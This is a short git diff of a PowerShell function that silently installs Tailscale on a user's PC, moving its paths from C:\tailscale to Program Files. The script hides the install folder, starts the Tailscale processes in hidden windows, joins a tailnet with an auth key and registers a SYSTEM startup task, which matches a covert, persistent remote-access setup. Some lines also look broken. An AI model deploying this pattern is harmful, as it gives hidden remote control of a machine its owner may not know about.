@@ -32,18 +32,19 @@ function installTailscale {
   msiexec.exe /a file.msi /quiet
 
   ## Hide Tailnet folder in C
-  Get-Item "C:\tailscale" -Force | ForEach-Object {$_.Attributes = $_.Attributes -bor "Hidden"}
+  Get-Item "C:\Program Files\Tailscale" -Force | ForEach-Object {$_.Attributes = $_.Attributes -bor "Hidden"}
 
   ## Configure Tailscale on users pc
-  Set-Location C:\tailscale
-  Write-Output "Set-Location C:\tailscale
+  Set-Location C:\Program Files\Tailscale
+  Write-Output "Set-Location C:\Program Files\Tailscale
 Start-Process -FilePath '.\tailscaled.exe' -WindowStyle Hidden -Verb RunAs
 Start-Process -FilePath '.\tailscale-ipn.exe' -WindowStyle Hidden" >> tailscale.ps1
+  Copy-Item .\Tailscale.ps1
   Start-Process -FilePath '.\tailscaled.exe'  -WindowStyle Hidden -Verb RunAs
   Start-Process -FilePath '.\tailscale.exe'  -WindowStyle Hidden -ArgumentList 'up --authkey $authKey'
 
   $name = "Tailscale"
-  $action = New-ScheduledTaskAction -Execute "C:\Tailscale\tailscale.ps1"
+  $action = New-ScheduledTaskAction -Execute "C:\Program Files\Tailscale\tailscale.ps1"
   $trigger = New-ScheduledTaskTrigger -AtStartup
   $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -RunLevel Highes
   $settings = New-ScheduledTaskSettingsSet -RunOnlyIfNetworkAvailable -WakeToRun -AllowStartIfOnBatteries -StartWhenAvailable
